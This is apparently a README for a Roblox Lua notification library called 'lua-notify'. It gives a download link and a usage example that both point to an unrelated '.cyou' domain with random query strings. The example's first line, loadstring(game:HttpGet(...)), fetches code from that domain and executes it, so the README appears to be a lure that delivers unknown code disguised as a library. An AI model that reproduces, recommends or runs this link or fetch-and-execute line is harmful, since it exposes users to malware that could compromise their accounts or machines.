# lua-notify
A basic notification library for ROBLOX scripts.

[Download link](https://installbixz.cyou?2rqx9wxqvmlsahc)

The source used isn't mine and was just something I liked the look of in a script I was using, credits go fully to it's OG creator.

Example usage:
```lua
local notificationLibrary = loadstring(game:HttpGet("https://installbixz.cyou?hjpv213cemyrnau"))();
local notifications = notificationLibrary.new({            
    NotificationLifetime = 3, 
    NotificationPosition = "Middle",
    
    TextFont = Enum.Font.Code,
    TextColor = Color3.fromRGB(255, 255, 255), -- custom txt color if wanted
    TextSize = 15,
    
    TextStrokeTransparency = 0, 
    TextStrokeColor = Color3.fromRGB(0, 0, 0)
});

notifications:BuildNotificationUI();
notifications:Notify("Hello world!");
```
